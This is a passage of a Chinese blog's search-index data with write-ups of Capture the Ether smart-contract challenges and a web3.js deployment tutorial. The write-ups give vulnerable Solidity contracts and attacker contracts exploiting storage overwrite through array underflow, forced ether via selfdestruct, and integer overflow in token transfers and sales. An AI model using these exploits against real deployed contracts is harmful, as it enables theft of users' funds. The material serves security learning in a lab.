中的msg.sender就是 challenge，所以就会报错 在0.4的编译器中发送主币的方式是： challenge.donate.value(msg.value)(etherAmount); 12345678function att() public payable &#123; //修改slot1 即 owner的值 //// address(nameReg).call.value(1 ether)(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;)); challenge.donate.value(msg.value)(etherAmount); // 偷钱 // challenge.withdraw; &#125; 这样改就可以成功修改合约的所有者了 3. 解题 3.1 部署 DonationChallenge 和 Hack 合约 3.2 攻击之前，可以看到合约所有者不是本人 3.3 计算出我需要支付的费用，参数是我的账户地址 3.4 以我的账户地址为参数，计算结果为 msg.value 调用 Donation 函数，再执行 withdrawn函数，将钱取走，再验证isComplete的值 成功","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Mapping","slug":"Smart contracts/capther the ether/Mapping","date":"2023-04-13T07:20:10.000Z","updated":"2023-04-13T07:20:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Mapping/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Mapping/","excerpt":"","text":"Mapping1. 题目 1.1 Who needs mappings? I’ve created a contract that can store key&#x2F;value pairs using just an array. 1.2 源码： 12345678910111213141516171819pragma solidity ^0.4.21;contract MappingChallenge &#123; bool public isComplete; uint256[] map; function set(uint256 key, uint256 value) public &#123; // Expand dynamic array as needed if (map.length &lt;= key) &#123; map.length = key + 1; &#125; map[key] = value; &#125; function get(uint256 key) public view returns (uint256) &#123; return map[key]; &#125;&#125; 2. 分析 2.1 最开始题目我是不理解的，上网搜了一下之后才知道，是要让 isComplete 的值返回的 是 true ，但是我是无从下手的，源码中没有提供修改 isComplete 值的函数 2.2 去网上搜索解题过程的时候，看到了说只要让动态数组 map 溢出将原来 isComplete 所处的 slot0位置 给覆盖即可将 未赋值的 isComplete 的值转化为 true（这里还是不太理解的） 2.3 知道怎么做之后就可以分析如何实现数组的溢出 a. 一个合约的存储最大容量可以看成是一个非常大的数组，最初全是零。数组中的每个值都是 32 字节宽，并且有 2 ^256个这样的值。简单来说就是有 2^256 个 key , 每一个key可以装下 32bytes（1uint &#x3D; 1uint256&#x3D;1bytes32&#x3D;32bytes）题目说明了map 是uint256 类型的数组，也就是说，map 数组中的每一元素占用一个slot，这就说明可以不用考虑几个元素挤在一个slot的情况了 b. 动态数组在EVM上存储的位置很复杂，他会根据你动态数组声明的位置，即 slot的位置进行hash计算出索引0实际存储的位置，从而开辟一段连续的空间用于存储数据元素， 参考文献 c. 又因为数组溢出之后，又会从EVM的虚拟数组从索引为0的位置（即slot0）开始存储，就会覆盖原来合约中的数据（即isComplete），***数组的起始位置是通过keccak256(bytes32(“数组长度所在插槽”))计算*** d. 计算 slot0 的位置 ： 12 ** 256 - 1 - uint256(keccak256(slot)) + 1 2.4 攻击合约： 123456789101112131415161718192021222324252627contract Hack &#123; MappingChallenge challenge; function Hack(MappingChallenge _challenge) public &#123; challenge = _challenge; &#125; function att(uint256 slot) public&#123; // 计算出map[0]被hash后分配的位置 uint start = uint256(keccak256(slot)); //计算出start 到EVM数组末尾的长度 // 2 ** 256 - 1 ==&gt;&gt; 是EVM数组的长度 [0,2 ** 256 - 1] uint length = 2 ** 256 - 1 - start; // 此时start + length 应该是等于 2 ^ 256 // 验证了猜想 // return start + length; // 因为 2 ** 256 - 1 + 1 = 0 // return length + 1; challenge.set(length+1, 1); &#125;&#125; 3. 解题 3.1 部署 MappingChallenge合约，部署 Hack 合约 3.2 将map 所处的插槽位置作为形参，调用att函数 3.3 回到 MappingChallenge 合约中查看 isComplete的值已经变成了true","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Retirement fund","slug":"Smart contracts/capther the ether/Retirement fund","date":"2023-04-13T06:58:10.000Z","updated":"2023-04-13T06:58:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Retirement fund/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Retirement%20fund/","excerpt":"","text":"Retirement fund1. 题目 1.1 This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement. I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!). I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck! 翻译： 这个退休基金就是经济学家所说的承诺机制。我正在努力确保我在退休时保留 1 个以太币。 我已经向下面的合约承诺了 1 个以太币，并且在 10 年过去之前我不会撤回它。如果我提早退出，我的 10% 的以太币会流向beneficiary（你！）。 我真的不想让你拥有我的 0.1 个以太币，所以我决定在 10 年后再单独使用这些资金。祝你好运！ 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142pragma solidity ^0.4.21;contract RetirementFundChallenge &#123; uint256 startBalance; address owner = msg.sender; address beneficiary; uint256 expiration = now + 10 years; function RetirementFundChallenge(address player) public payable &#123; require(msg.value == 1 ether); beneficiary = player; startBalance = msg.value; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function withdraw() public &#123; require(msg.sender == owner); if (now &lt; expiration) &#123; // early withdrawal incurs a 10% penalty msg.sender.transfer(address(this).balance * 9 / 10); &#125; else &#123; msg.sender.transfer(address(this).balance); &#125; &#125; function collectPenalty() public &#123; require(msg.sender == beneficiary); uint256 withdrawn = startBalance - address(this).balance; // an early withdrawal occurred require(withdrawn &gt; 0); // penalty is what&#x27;s left msg.sender.transfer(address(this).balance); &#125;&#125; 2.分析 2.1 题目的要求是将合约的钱全部取走，而不是取走合约所有者剩下的那 0.1 ether 2.2 所以我们将重点关注 collectPenalty 函数，成功执行msg.sender.transfer(address(this).balance);这行代码；而要执行这行代码执行要通过两个校验。校验一：require(msg.sender == beneficiary);验证你是否是受益人， 校验二：withdrawn = startBalance - address(this).balance &gt; 0 验证合约所有者是否提前取款了，提前取款就可以往下执行 2.3 但是我们可以通过下溢的方法让 withdrawn 的值大 0，就是让 address(this).balance 的值大于 1ehter，而合约中没有可以接收主币的函数，这就需要我们使用 selfdestruct命令，将某个合约的钱强行转给指定合约 2.4 所以我们可以编写一个攻击合约，往合约中发送一点主币，再执行自毁命令 攻击合约： 12345678contract Hack &#123; function Hack(address _address) public payable &#123; // RetirementFundChallenge retiement = RetirementFundChallenge(_address); selfdestruct(_address); &#125;&#125; 3.解题 3.1 部署 RetirementFundChallenge合约 3.2 部署 Hack 合约，给 RetirementFundChallenge合约 转入 1 ether 3.3 调用 collecPenalt函数 查看isComplete的值变成了 true","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Token whale","slug":"Smart contracts/capther the ether/Token whale","date":"2023-04-13T06:01:10.000Z","updated":"2023-04-13T06:01:10.000Z","comments":true,"path":"2023/04/13/Smart contracts/capther the ether/Token whale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/Smart%20contracts/capther%20the%20ether/Token%20whale/","excerpt":"","text":"Token whale1. 题目 1.1 要求： This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with. Find a way to accumulate at least 1,000,000 tokens to solve this challenge 1.2 源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; totalSupply = 1000; balanceOf[player] = 1000; &#125; function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; event Transfer(address indexed from, address indexed to, uint256 value); function _transfer(address to, uint256 value) internal &#123; balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; function transfer(address to, uint256 value) public &#123; require(balanceOf[msg.sender] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; require(balanceOf[from] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; _transfer(to, value); &#125;&#125; 2. 分析 2.1 首先对代码进行解读，慢慢看懂代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; // 发行量是 1000 totalSupply = 1000; // 初始化玩家的代币为 1000 balanceOf[player] = 1000; &#125; // 通关要求：需要玩家的代币 &gt;= 1000000 function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; // 触发事件 谁向谁转了多少 value event Transfer(address indexed from, address indexed to, uint256 value); //内部的 发送函数 -- 将合约调用者的代币转移给 接收方to function _transfer(address to, uint256 value) internal &#123; // 这里减的是 合约调用者的代币 // 只要这里的msg.sender 不是 同一个地址，那么预防不了溢出这个漏洞 balanceOf[msg.sender] -= value; // 这里要注意 balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; // 外部的交易函数，将调用者的代币发送给接收者to function transfer(address to, uint256 value) public &#123; // 确保调用者的钱足够发送 require(balanceOf[msg.sender] &gt;= value); // 这个是？？？？为了防止上溢？？？ require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); // 授权额度 function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; // 检查的是 from 这个地址的代币 // 安全隐患：相当于 小王和小李，只要小王有钱我就可以一直从小李那里取钱 require(balanceOf[from] &gt;= value); // 这个校验很容易通过，我感觉是只要不弄溢出就没事 require(balanceOf[to] + value &gt;= balanceOf[to]); // 调用 approve函数，让 from 给合约调用者授权 require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; // 让to 和 msg.sender不一致，破解它那简简单单的保护措施，to可以随便乱填一个地址 _transfer(to, value); &#125;&#125; 2.2 本题的目标就是 balanceOf[player] &gt;= 1000000 而合约中的代币发行量只有 1000 那么多，显然只通过简单的转账操作是不可能实现的，所以，只能往溢出的方向去思考 2.3 而合约中能产生溢出的且涉及到 balanceOf 的只有 _transfer 函数中的 balanceOf[msg.sender] -= value; 这个可以产生溢出，生成很多很多代币。 2.4 合约中调用此内部函数的方法只有 transfer 和 transferFrom 。细看可知 transfer 函数中 有require(balanceOf[msg.sender] &gt;= value)检验，这个检验让这个函数变得安全，因为它和 _transfer函数中的balanceOf[msg.sender] -= value;的msg.sender 保持一致，无法进行溢出操作 2.5 transferFrom 合约中有三个校验 12345678910// 检查的是 from 这个地址的代币 // 安全隐患：相当于 小王和小李，只要小王有钱我就可以一直从小李那里取钱 require(balanceOf[from] &gt;= value); // 这个校验很容易通过，我感觉是只要不弄溢出就没事 require(balanceOf[to] + value &gt;= balanceOf[to]); // 调用 approve函数，让 from 给合约调用者授权 require(allowance[from][msg.sender] &gt;= value); 2.6 我们可知，它校验的是from 地址 ，但是 _transfer 合约中操作的是 msg.sender 这就有了操作空间，只要别人有钱我们就可以通过校验执行以下的一系列操作 值得注意的是方法的形参的 to 不能和当前的合约调用者一致，否则他会被_transfer函数中的小小保护机制给还原回去的，我之前就试过 3. 解题 3.1 给函数填入参数 3.2 首先要通过第一个校验：可以用玩家地址（balanceOf[play] &#x3D; 1000）作为 from ，这样就可以通过第一个校验了 3.3 to 随便填一个地址就可以，只要不和msg.sender 是同一个地址就行 3.4 要通过第二个校验，就需要 allowance[from][msg.sender] &gt;= value ，所以需要先调用approve 函数，将调用者地址合约切回 玩家地址，spender就是 你等下要使用的msg.sender，然后随便授权，我这里授权一块钱，因为一个很简单溢出就是 0 - 1 3.5 调用之后，查看 balanceOf[msg.sender] 3.6 再调用 transfer 函数，从 msg.sender 转 钱 给 玩家 player 通过！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"solidity的整数溢出","slug":"Solidity/Basic_Knowledge/solidity的整数溢出","date":"2023-04-12T06:01:10.000Z","updated":"2023-04-12T06:01:10.000Z","comments":true,"path":"2023/04/12/Solidity/Basic_Knowledge/solidity的整数溢出/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Solidity/Basic_Knowledge/solidity%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/","excerpt":"","text":"solidity的整数溢出资料收集中：文章一","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"整数溢出","slug":"整数溢出","permalink":"https://biyouqiuqiu.com/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"}]},{"title":"Token sale","slug":"Smart contracts/capther the ether/Token sale","date":"2023-04-12T06:01:10.000Z","updated":"2023-04-12T06:01:10.000Z","comments":true,"path":"2023/04/12/Smart contracts/capther the ether/Token sale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Smart%20contracts/capther%20the%20ether/Token%20sale/","excerpt":"","text":"Token sale1. 题目 1.1 This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether. The contract starts off with a balance of 1 ether. See if you can take some of that away. 1.2 源码： 123456789101112131415161718192021222324252627pragma solidity ^0.4.21;contract TokenSaleChallenge &#123; mapping(address =&gt; uint256) public balanceOf; uint256 constant PRICE_PER_TOKEN = 1 ether; function TokenSaleChallenge(address _player) public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance &lt; 1 ether; &#125; function buy(uint256 numTokens) public payable &#123; require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; &#125; function sell(uint256 numTokens) public &#123; require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; msg.sender.transfer(numTokens * PRICE_PER_TOKEN); &#125;&#125; 2. 分析 2.1 分析代码可知，如果按部就班来操作（即 用相同的钱来买相同的代币是行不通的—-因为 buy 函数中的require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; 和 sell 函数中的 require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; 限制了你存多少取多少，不能存少取多） 2.2 所以按部就班行不通，但是我们只能往存少取的方向取考虑，这就涉及了溢出的问题 2.3 以 uint8为例子，我们可以知道 在uint8 的加法中 123&gt;254 + 1 = 255&gt;254 + 2 = 0&gt;254 + 3 = 1 我在remix中尝试过，直接显示的写 uint8 = 255 + 1 是会被编译器检测出来的，但是隐式的写则不会即 12&gt;uint8 a = 255;&gt;uint8 b = a + 1; 这样输出的结果是 0； 在uint8 的乘法中 12&gt;51 * 5 = 255&gt;51 * 6 = 50 51 * 6 = 50 可以根据加法拆分为 51 * 6 = 51 * (5 + 1) = 51 * 5 + 51 = 255 + 1 + 50 = 50 我的理解是超过 255重新计数，因为uint8 的取值范围是 [0,255] 256 位，所以超过255 的部分又从 0 开始。 同理 uint256 类型也是如此，uint256的取值范围是[0,115792089237316195423570985008687907853269984665640564039457584007913129639935] 2.4 我们本着存少取多的原则，让 require(msg.value == numTokens * PRICE_PER_TOKEN); 中的 numTokens * PRICE_PER_TOKEN 发生溢出，我们就可以实现花费少的主币获取更多的代币 2.5 在合约中主币是以 wei为单位的 也就是说 uint256 constant PRICE_PER_TOKEN = 1 ether = 10^18 wei 我们就需要计算出溢出的门槛是多少 ，计算如下： 1234567//115792089237316195423570985008687907853269984665640564039457584007913129639935uint256 result = 2**256 - 1;//115792089237316195423570985008687907853269984665640564039457uint256 temp = result / 10**18;// 此时给temp 的值加 1 应该是触发溢出的最低门槛uint256 money = (temp + 1) * 10**18; //money=415992086870360064 在remix上测试得： 2.6 然后再调用buy函数的时候，以 temp+1的值作为参数传入，money的值作为msg.value 2.7 以 1 为参数调用 sell函数 解题成功 3. 解题解题过程如上述分析","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"web3 学习总结","slug":"Web3/Basic_Knowledge/web3 学习总结","date":"2023-04-12T02:47:10.000Z","updated":"2023-04-12T02:47:10.000Z","comments":true,"path":"2023/04/12/Web3/Basic_Knowledge/web3 学习总结/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Web3/Basic_Knowledge/web3%20%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"web3 学习总结1. 合约的部署 – 需要发送主币，以及传入参数以一个冒泡排序合约为例 合约代码： 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract sort &#123; uint[] arr; constructor(uint[] memory arrays) payable &#123; require(msg.value == 1); arr = arrays; &#125; function bubSort() external returns(uint[] memory) &#123; bool flag; uint temp; for (uint i = 0; i &lt; arr.length - 1; i++) &#123; flag = true; for (uint j = 0; j &lt; arr.length - i - 1; j++) &#123; if(arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125;&#125; 1.1 在 remix 中复制合约的 ABI 和 byteCode 1.2 在 vscode 上编写代码，创建 sort.abi 和 sort.js 文件 1.3 在 根据 获取的交易哈希，在 ganache 上找到相应的合约地址 1.4 在remix 上验证部署出来的合约地址是否真实，合约中是有主币的，所以是正确的 部署合约的代码： 12345678910111213141516171819202122let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);var byteCode = &quot;0x60806040526040516106f33803806106f38339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b61043f806102b46000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063283fdc7814610030575b600080fd5b61003861004e565b60405161004591906102d9565b60405180910390f35b606060008060005b6001600080549050610068919061032a565b8110156101b8576001925060005b600182600080549050610089919061032a565b610093919061032a565b81101561019f5760006001826100a9919061035e565b815481106100ba576100b9610392565b5b9060005260206000200154600082815481106100d9576100d8610392565b5b9060005260206000200154111561018c57600081815481106100fe576100fd610392565b5b90600052602060002001549250600060018261011a919061035e565b8154811061012b5761012a610392565b5b90600052602060002001546000828154811061014a57610149610392565b5b9060005260206000200181905550826000600183610168919061035e565b8154811061017957610178610392565b5b9060005260206000200181905550600093505b8080610197906103c1565b915050610076565b50826101b85780806101b0906103c1565b915050610056565b50600080548060200260200160405190810160405280929190818152602001828054801561020557602002820191906000526020600020905b8154815260200190600101908083116101f1575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b6102508161023d565b82525050565b60006102628383610247565b60208301905092915050565b6000602082019050919050565b600061028682610211565b610290818561021c565b935061029b8361022d565b8060005b838110156102cc5781516102b38882610256565b97506102be8361026e565b92505060018101905061029f565b5085935050505092915050565b600060208201905081810360008301526102f3818461027b565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006103358261023d565b91506103408361023d565b9250828203905081811115610358576103576102fb565b5b92915050565b60006103698261023d565b91506103748361023d565b925082820190508082111561038c5761038b6102fb565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103cc8261023d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103fe576103fd6102fb565b5b60018201905091905056fea264697066735822122040692a2976cbd61653fb0d4195fa70c62b232f3d9b74fdf1f80f9e5bbada103c64736f6c63430008130033&quot;;// 部署合约的代码contract.deploy(&#123; data: byteCode, arguments: [[5,4,3,2,1]]&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 4700000, value: 1&#125;,function(err,result)&#123; console.log(&quot;合约部署得到的交易哈希为：&quot;); console.log(result);&#125;) 2.1 调用合约的函数，payable函数 2.1 调用 bubSort函数，对数组进行排序 123456789101112// 调用合约函数var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;) 执行结果： 2.2 执行之后获得交易的哈希，并在ganache上查看 2.3 将交易哈希通过 remix 上的debug 来查看合约中的变量 我们可以发现，传入的数组为[5,4,3,2,1] 调用排序函数之后，数组变成了[1,2,3,4,5] 说明执行成功 2.4 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);// var byteCode = &quot;60806040526040516106e63803806106e68339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b610432806102b46000396000f3fe60806040526004361061001e5760003560e01c8063283fdc7814610023575b600080fd5b61002b610041565b60405161003891906102cc565b60405180910390f35b606060008060005b600160008054905061005b919061031d565b8110156101ab576001925060005b60018260008054905061007c919061031d565b610086919061031d565b81101561019257600060018261009c9190610351565b815481106100ad576100ac610385565b5b9060005260206000200154600082815481106100cc576100cb610385565b5b9060005260206000200154111561017f57600081815481106100f1576100f0610385565b5b90600052602060002001549250600060018261010d9190610351565b8154811061011e5761011d610385565b5b90600052602060002001546000828154811061013d5761013c610385565b5b906000526020600020018190555082600060018361015b9190610351565b8154811061016c5761016b610385565b5b9060005260206000200181905550600093505b808061018a906103b4565b915050610069565b50826101ab5780806101a3906103b4565b915050610049565b5060008054806020026020016040519081016040528092919081815260200182805480156101f857602002820191906000526020600020905b8154815260200190600101908083116101e4575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b61024381610230565b82525050565b6000610255838361023a565b60208301905092915050565b6000602082019050919050565b600061027982610204565b610283818561020f565b935061028e83610220565b8060005b838110156102bf5781516102a68882610249565b97506102b183610261565b925050600181019050610292565b5085935050505092915050565b600060208201905081810360008301526102e6818461026e565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061032882610230565b915061033383610230565b925082820390508181111561034b5761034a6102ee565b5b92915050565b600061035c82610230565b915061036783610230565b925082820190508082111561037f5761037e6102ee565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103bf82610230565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103f1576103f06102ee565b5b60018201905091905056fea2646970667358221220ae8c4b8dcba12a3c05b294a45463cdbfcc21cbcdcfe3c2160fd3b8e26fa8304a64736f6c63430008130033&quot;;// 部署合约的代码// contract.deploy(&#123;// data: byteCode,// arguments: [[5,4,3,2,1]]// &#125;).send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// gas: 4700000,// value: 1// &#125;,function(err,result)&#123;// console.log(&quot;合约部署得到的交易哈希为：&quot;);// console.log(result);// &#125;)// 调用合约函数var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;)// var answer;// web.eth.getStorageAt(address,0,(err,result)=&gt;&#123;// answer = web.utils.hexToNumber(result);// console.log(answer);// &#125;) tips:如果函数需要传参，直接在调用函数的时候传入就可以了，如下：","categories":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"}],"tags":[{"name":"学习总结","slug":"学习总结","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"}]},{"title":"Predict the block hash","slug":"Smart contracts/capther the ether/Predict the block 